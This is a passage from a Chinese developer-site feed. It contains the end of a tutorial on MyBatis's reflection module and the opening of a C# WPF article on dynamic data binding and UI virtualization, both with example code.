            <span class="hljs-keyword">return</span> <span class="hljs-title function_">resolveParameterizedType</span>(
                (<span class="hljs-title class_">ParameterizedType</span>) rawType);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rawType <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">GenericArrayType</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-title function_">resolveGenericArrayType</span>(
                (<span class="hljs-title class_">GenericArrayType</span>) rawType);
        }
        <span class="hljs-keyword">return</span> rawType;
    }
}
</code></pre>
<h2 data-id="heading-29">5.2 TypeAliasRegistry - 类型别名</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TypeAliasRegistry</span> {
    <span class="hljs-comment">// 别名到类型的映射</span>
    <span class="hljs-keyword">private</span> final <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Class</span>&lt;?&gt;&gt; typeAliases 
        = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();

    <span class="hljs-comment">// 注册类型别名</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">registerAlias</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> alias, 
                             Class&lt;?&gt; value</span>) {
        <span class="hljs-keyword">if</span> (alias == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeException</span>(
                <span class="hljs-string">"Type alias cannot be null"</span>);
        }
        typeAliases.<span class="hljs-title function_">put</span>(alias, value);
    }

    <span class="hljs-comment">// 根据别名解析类型</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Class</span>&lt;?&gt; <span class="hljs-title function_">resolveAlias</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> <span class="hljs-built_in">string</span></span>) {
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span> == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }

        <span class="hljs-title class_">String</span> key = <span class="hljs-built_in">string</span>.<span class="hljs-title function_">toLowerCase</span>(<span class="hljs-title class_">Locale</span>.<span class="hljs-property">ENGLISH</span>);
        <span class="hljs-title class_">Class</span>&lt;?&gt; value = typeAliases.<span class="hljs-title function_">get</span>(key);

        <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">return</span> <span class="hljs-title class_">Class</span>.<span class="hljs-title function_">forName</span>(<span class="hljs-built_in">string</span>);
            } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">ClassNotFoundException</span> e) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeException</span>(
                    <span class="hljs-string">"Could not resolve type alias '"</span> 
                    + <span class="hljs-built_in">string</span> + <span class="hljs-string">"'"</span>, e);
            }
        }
        <span class="hljs-keyword">return</span> value;
    }
}
</code></pre>
<h2 data-id="heading-30">5.3 TypeHandlerRegistry - 类型处理器</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TypeHandlerRegistry</span> {
    <span class="hljs-comment">// 类型到处理器的映射</span>
    <span class="hljs-keyword">private</span> final <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">Type</span>, <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">JdbcType</span>, <span class="hljs-title class_">TypeHandler</span>&lt;?&gt;&gt;&gt; 
        typeHandlerMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();

    <span class="hljs-comment">// 获取类型处理器</span>
    <span class="hljs-keyword">public</span> &lt;T&gt; <span class="hljs-title class_">TypeHandler</span>&lt;T&gt; <span class="hljs-title function_">getTypeHandler</span>(<span class="hljs-params">
        Type <span class="hljs-keyword">type</span>, 
        JdbcType jdbcType</span>) {

        <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">JdbcType</span>, <span class="hljs-title class_">TypeHandler</span>&lt;?&gt;&gt; jdbcTypeHandlerMap 
            = typeHandlerMap.<span class="hljs-title function_">get</span>(<span class="hljs-keyword">type</span>);

        <span class="hljs-keyword">if</span> (jdbcTypeHandlerMap != <span class="hljs-literal">null</span>) {
            <span class="hljs-title class_">TypeHandler</span>&lt;?&gt; handler = 
                jdbcTypeHandlerMap.<span class="hljs-title function_">get</span>(jdbcType);
            <span class="hljs-keyword">if</span> (handler != <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">return</span> (<span class="hljs-title class_">TypeHandler</span>&lt;T&gt;) handler;
            }
        }
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">getTypeHandler</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property">class</span>);
    }
}
</code></pre>
<h2 data-id="heading-31">六、元数据获取</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae9111ddbb8543d4832af6ea60dc9b8e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767860147&amp;x-signature=54mvZyffa72Z%2FE0fPTS4soFoHzU%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-32">6.1 获取类信息</h2>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">ClassInfo</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">analyze</span>(<span class="hljs-params">Class&lt;?&gt; clazz</span>)</span> {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"类名: "</span> 
            + clazz.getName());
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"简单名称: "</span> 
            + clazz.getSimpleName());
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"包名: "</span> 
            + clazz.getPackage().getName());
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"父类: "</span> 
            + clazz.getSuperclass().getName());
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"接口: "</span> 
            + Arrays.toString(clazz.getInterfaces()));

        <span class="hljs-comment">// 获取修饰符</span>
        <span class="hljs-built_in">int</span> modifiers = clazz.getModifiers();
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"是否为public: "</span> 
            + Modifier.isPublic(modifiers));
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"是否为abstract: "</span> 
            + Modifier.isAbstract(modifiers));
    }
}
</code></pre>
<h2 data-id="heading-33">6.2 获取方法信息</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MethodInfo</span> {
    <span class="hljs-comment">// 判断是否为getter方法</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">isGetter</span>(<span class="hljs-params">Method method</span>) {
        <span class="hljs-title class_">String</span> name = method.<span class="hljs-title function_">getName</span>();
        <span class="hljs-keyword">return</span> (name.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"get"</span>) 
                &amp;&amp; name.<span class="hljs-title function_">length</span>() &gt; <span class="hljs-number">3</span> 
                &amp;&amp; method.<span class="hljs-title function_">getParameterTypes</span>().<span class="hljs-property">length</span> == <span class="hljs-number">0</span>)
            || (name.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"is"</span>) 
                &amp;&amp; name.<span class="hljs-title function_">length</span>() &gt; <span class="hljs-number">2</span> 
                &amp;&amp; method.<span class="hljs-title function_">getParameterTypes</span>().<span class="hljs-property">length</span> == <span class="hljs-number">0</span>
                &amp;&amp; method.<span class="hljs-title function_">getReturnType</span>() == <span class="hljs-built_in">boolean</span>.<span class="hljs-property">class</span>);
    }

    <span class="hljs-comment">// 判断是否为setter方法</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">isSetter</span>(<span class="hljs-params">Method method</span>) {
        <span class="hljs-title class_">String</span> name = method.<span class="hljs-title function_">getName</span>();
        <span class="hljs-keyword">return</span> name.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"set"</span>) 
            &amp;&amp; name.<span class="hljs-title function_">length</span>() &gt; <span class="hljs-number">3</span> 
            &amp;&amp; method.<span class="hljs-title function_">getParameterTypes</span>().<span class="hljs-property">length</span> == <span class="hljs-number">1</span>
            &amp;&amp; method.<span class="hljs-title function_">getReturnType</span>() == <span class="hljs-built_in">void</span>.<span class="hljs-property">class</span>;
    }

    <span class="hljs-comment">// 获取属性名</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getPropertyName</span>(<span class="hljs-params">Method method</span>) {
        <span class="hljs-title class_">String</span> name = method.<span class="hljs-title function_">getName</span>();
        <span class="hljs-keyword">if</span> (name.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"get"</span>) 
            || name.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"set"</span>)) {
            name = name.<span class="hljs-title function_">substring</span>(<span class="hljs-number">3</span>);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (name.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"is"</span>)) {
            name = name.<span class="hljs-title function_">substring</span>(<span class="hljs-number">2</span>);
        }
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Character</span>.<span class="hljs-title function_">toLowerCase</span>(name.<span class="hljs-title function_">charAt</span>(<span class="hljs-number">0</span>)) 
               + name.<span class="hljs-title function_">substring</span>(<span class="hljs-number">1</span>);
    }
}
</code></pre>
<h2 data-id="heading-34">6.3 ReflectorFactory - 工厂模式</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReflectorFactory</span> {
    <span class="hljs-comment">// Reflector缓存</span>
    <span class="hljs-keyword">private</span> final <span class="hljs-title class_">ConcurrentMap</span>&lt;<span class="hljs-title class_">Class</span>&lt;?&gt;, <span class="hljs-title class_">Reflector</span>&gt; 
        reflectorMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();

    <span class="hljs-comment">// 获取Reflector</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Reflector</span> <span class="hljs-title function_">findForClass</span>(<span class="hljs-params">Class&lt;?&gt; <span class="hljs-keyword">type</span></span>) {
        <span class="hljs-keyword">return</span> reflectorMap.<span class="hljs-title function_">computeIfAbsent</span>(<span class="hljs-keyword">type</span>, k -&gt; {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reflector</span>(k);
        });
    }

    <span class="hljs-comment">// 判断是否已有缓存</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">hasReflectorFor</span>(<span class="hljs-params">Class&lt;?&gt; <span class="hljs-keyword">type</span></span>) {
        <span class="hljs-keyword">return</span> reflectorMap.<span class="hljs-title function_">containsKey</span>(<span class="hljs-keyword">type</span>);
    }
}
</code></pre>
<h2 data-id="heading-35">七、最佳实践</h2>
<h2 data-id="heading-36">7.1 性能优化建议</h2>
<pre><code class="hljs">✅缓存反射信息Reflector自动缓存类的反射信息，避免重复解析
✅避免频繁反射尽量使用MetaObject而非直接使用Java反射API
✅使用对象池在高并发场景下复用对象实例
✅延迟加载只在真正需要时才解析元数据
</code></pre>
<h2 data-id="heading-37">7.2 使用建议</h2>
<pre><code class="hljs">✅ 首选MetaObject提供统一、友好的属性访问接口
✅ 继承BaseWrapper实现自定义的对象包装器时继承BaseWrapper
✅ 扩展ObjectFactory支持特殊类型的实例化需求
✅ 注册类型别名简化XML配置，提升可读性
</code></pre>
<h2 data-id="heading-38">7.3 常见问题解决</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 错误原因：属性名不匹配</span>
<span class="hljs-comment">// User类字段：userName</span>
<span class="hljs-comment">// getter方法：getName() ❌</span>

<span class="hljs-comment">// 正确做法：确保符合JavaBean规范</span>
<span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getUserName</span>(<span class="hljs-params"/>) {  ✅
    <span class="hljs-keyword">return</span> userName;
}

<span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setUserName</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> userName</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">userName</span> = userName;
}
<span class="hljs-title class_">MetaObject</span> metaObject = <span class="hljs-title class_">MetaObject</span>.<span class="hljs-title function_">forObject</span>(user, ...);

<span class="hljs-comment">// 直接访问</span>
<span class="hljs-title class_">Object</span> address = metaObject.<span class="hljs-title function_">getValue</span>(<span class="hljs-string">"address"</span>);

<span class="hljs-comment">// 嵌套访问</span>
<span class="hljs-title class_">Object</span> city = metaObject.<span class="hljs-title function_">getValue</span>(<span class="hljs-string">"address.city"</span>);

<span class="hljs-comment">// 带索引的访问</span>
<span class="hljs-title class_">Object</span> item = metaObject.<span class="hljs-title function_">getValue</span>(<span class="hljs-string">"orders[0].itemName"</span>);
<span class="hljs-comment">// 使用TypeHandlerRegistry处理类型转换</span>
<span class="hljs-title class_">TypeHandlerRegistry</span> registry = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeHandlerRegistry</span>();
<span class="hljs-title class_">TypeHandler</span>&lt;<span class="hljs-title class_">String</span>&gt; handler = 
    registry.<span class="hljs-title function_">getTypeHandler</span>(<span class="hljs-title class_">String</span>.<span class="hljs-property">class</span>);

<span class="hljs-comment">// 设置参数</span>
handler.<span class="hljs-title function_">setParameter</span>(ps, <span class="hljs-number">1</span>, <span class="hljs-string">"张三"</span>);

<span class="hljs-comment">// 获取结果</span>
<span class="hljs-title class_">String</span> result = handler.<span class="hljs-title function_">getResult</span>(rs, <span class="hljs-string">"name"</span>);
</code></pre>
<h2 data-id="heading-39">八、总结</h2>
<h2 data-id="heading-40">关键组件</h2>
<pre><code class="hljs">🔹ObjectFactory - 对象工厂，负责创建对象实例 
🔹PropertyTokenizer - 属性分词器，解析嵌套属性表达式
🔹 PropertyCopier - 属性复制器，实现对象属性复制 
🔹 Reflector - 反射器，缓存类的反射信息 
🔹 MetaClass - 元数据类，封装Reflector 
🔹 MetaObject - 元对象，提供统一的属性访问接口
</code></pre>
<h2 data-id="heading-41">设计思想</h2>
<p>MyBatis反射模块的设计思想：</p>
<pre><code class="hljs language-javascript" lang="javascript">💎 缓存优化 - 缓存反射信息，避免重复解析
💎 封装复杂度 - 封装<span class="hljs-title class_">Java</span>反射<span class="hljs-variable constant_">API</span>，简化使用 
💎 统一接口 - 通过<span class="hljs-title class_">MetaObject</span>提供统一操作接口 
💎 扩展性强 - 支持<span class="hljs-title class_">Map</span>、<span class="hljs-title class_">Collection</span>等多种对象类型 
💎 性能优先 - 反射信息只解析一次并缓存
</code></pre>
<h6 data-id="heading-42">MyBatis的反射模块是整个框架的基石，它通过精心设计的架构和巧妙的缓存机制，为我们提供了高效、灵活的对象操作能力。</h6></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[C# 上位机开发中的动态绑定与虚拟化]]></title>    <link>https://juejin.cn/post/7589916567875633194</link>    <guid>https://juejin.cn/post/7589916567875633194</guid>    <pubDate>2026-01-01T08:16:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589916567875633194" data-draft-id="7589839433321168959" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="C# 上位机开发中的动态绑定与虚拟化"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-01T08:16:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="七宝三叔"/> <meta itemprop="url" content="https://juejin.cn/user/2508420375913500"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            C# 上位机开发中的动态绑定与虚拟化
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2508420375913500/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    七宝三叔
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T08:16:46.000Z" title="Thu Jan 01 2026 08:16:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、动态绑定 (Dynamic Binding)</h2>
<h3 data-id="heading-1">1. 数据绑定基础</h3>
<p>csharp</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// Model类</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">DeviceData</span> : <span class="hljs-title">INotifyPropertyChanged</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">string</span> _deviceName;
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">double</span> _temperature;
    <span class="hljs-keyword">private</span> DateTime _timestamp;
    
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> DeviceName
    {
        <span class="hljs-keyword">get</span> =&gt; _deviceName;
        <span class="hljs-keyword">set</span>
        {
            _deviceName = <span class="hljs-keyword">value</span>;
            OnPropertyChanged();
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">double</span> Temperature
    {
        <span class="hljs-keyword">get</span> =&gt; _temperature;
        <span class="hljs-keyword">set</span>
        {
            _temperature = <span class="hljs-keyword">value</span>;
            OnPropertyChanged();
            OnPropertyChanged(<span class="hljs-keyword">nameof</span>(TemperatureFormatted));
        }
    }
    
    <span class="hljs-keyword">public</span> DateTime Timestamp
    {
        <span class="hljs-keyword">get</span> =&gt; _timestamp;
        <span class="hljs-keyword">set</span>
        {
            _timestamp = <span class="hljs-keyword">value</span>;
            OnPropertyChanged();
        }
    }
    
    <span class="hljs-comment">// 计算属性</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> TemperatureFormatted =&gt; <span class="hljs-string">$"<span class="hljs-subst">{_temperature:F1}</span>°C"</span>;
    
    <span class="hljs-comment">// INotifyPropertyChanged 实现</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> PropertyChangedEventHandler PropertyChanged;
    
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnPropertyChanged</span>(<span class="hljs-params">[CallerMemberName] <span class="hljs-built_in">string</span> propertyName = <span class="hljs-literal">null</span></span>)</span>
    {
        PropertyChanged?.Invoke(<span class="hljs-keyword">this</span>, <span class="hljs-keyword">new</span> PropertyChangedEventArgs(propertyName));
    }
}
</code></pre>
<h3 data-id="heading-2">2. 动态绑定集合</h3>
<p>csharp</p>
<pre><code class="hljs language-ini" lang="ini">// ViewModel
public class DeviceViewModel : INotifyPropertyChanged
{
    private ObservableCollection&lt;DeviceData&gt; _devices<span class="hljs-comment">;</span>
    private DeviceData _selectedDevice<span class="hljs-comment">;</span>
    
    public ObservableCollection&lt;DeviceData&gt; Devices
    {
        <span class="hljs-attr">get</span> =&gt; _devices<span class="hljs-comment">;</span>
        set
        {
            <span class="hljs-attr">_devices</span> = value<span class="hljs-comment">;</span>
            OnPropertyChanged()<span class="hljs-comment">;</span>
        }
    }
    
    public DeviceData SelectedDevice
    {
        <span class="hljs-attr">get</span> =&gt; _selectedDevice<span class="hljs-comment">;</span>
        set
        {
            <span class="hljs-attr">_selectedDevice</span> = value<span class="hljs-comment">;</span>
            OnPropertyChanged()<span class="hljs-comment">;</span>
        }
    }
    
    // 动态添加设备
    public void AddDevice(string name)
    {
        var <span class="hljs-attr">device</span> = new DeviceData
        {
            <span class="hljs-attr">DeviceName</span> = name,
            <span class="hljs-attr">Temperature</span> = <span class="hljs-number">25.0</span>,
            <span class="hljs-attr">Timestamp</span> = DateTime.Now
        }<span class="hljs-comment">;</span>
        
        Devices.Add(device)<span class="hljs-comment">;</span>
    }
    
    // 动态更新数据
    public void UpdateDeviceTemperature(string deviceName, double temperature)
    {
        var <span class="hljs-attr">device</span> = Devices.FirstOrDefault(d =&gt; d.DeviceName == deviceName)<span class="hljs-comment">;</span>
        if (device != null)
        {
            <span class="hljs-attr">device.Temperature</span> = temperature<span class="hljs-comment">;</span>
            <span class="hljs-attr">device.Timestamp</span> = DateTime.Now<span class="hljs-comment">;</span>
        }
    }
}
</code></pre>
<h3 data-id="heading-3">3. XAML绑定示例</h3>
<p>xml</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- MainWindow.xaml --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Window</span> <span class="hljs-attr">x:Class</span>=<span class="hljs-string">"MonitorApp.MainWindow"</span>
        <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://schemas.microsoft.com/winfx/2006/xaml/presentation"</span>
        <span class="hljs-attr">xmlns:x</span>=<span class="hljs-string">"http://schemas.microsoft.com/winfx/2006/xaml"</span>&gt;</span>
    
    <span class="hljs-tag">&lt;<span class="hljs-name">Grid</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- DataGrid动态绑定 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">DataGrid</span> <span class="hljs-attr">ItemsSource</span>=<span class="hljs-string">"{Binding Devices}"</span>
                  <span class="hljs-attr">SelectedItem</span>=<span class="hljs-string">"{Binding SelectedDevice}"</span>
                  <span class="hljs-attr">AutoGenerateColumns</span>=<span class="hljs-string">"False"</span>
                  <span class="hljs-attr">VirtualizingPanel.IsVirtualizing</span>=<span class="hljs-string">"True"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">DataGrid.Columns</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">DataGridTextColumn</span> <span class="hljs-attr">Header</span>=<span class="hljs-string">"设备名称"</span> 
                                    <span class="hljs-attr">Binding</span>=<span class="hljs-string">"{Binding DeviceName}"</span>/&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">DataGridTextColumn</span> <span class="hljs-attr">Header</span>=<span class="hljs-string">"温度"</span> 
                                    <span class="hljs-attr">Binding</span>=<span class="hljs-string">"{Binding TemperatureFormatted}"</span>/&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">DataGridTextColumn</span> <span class="hljs-attr">Header</span>=<span class="hljs-string">"更新时间"</span> 
                                    <span class="hljs-attr">Binding</span>=<span class="hljs-string">"{Binding Timestamp, StringFormat=HH:mm:ss}"</span>/&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">DataGrid.Columns</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">DataGrid</span>&gt;</span>
        
        <span class="hljs-comment">&lt;!-- 实时数据显示 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">ItemsControl</span> <span class="hljs-attr">ItemsSource</span>=<span class="hljs-string">"{Binding Devices}"</span>
                      <span class="hljs-attr">VirtualizingPanel.IsVirtualizing</span>=<span class="hljs-string">"True"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">ItemsControl.ItemTemplate</span>&gt;</span>
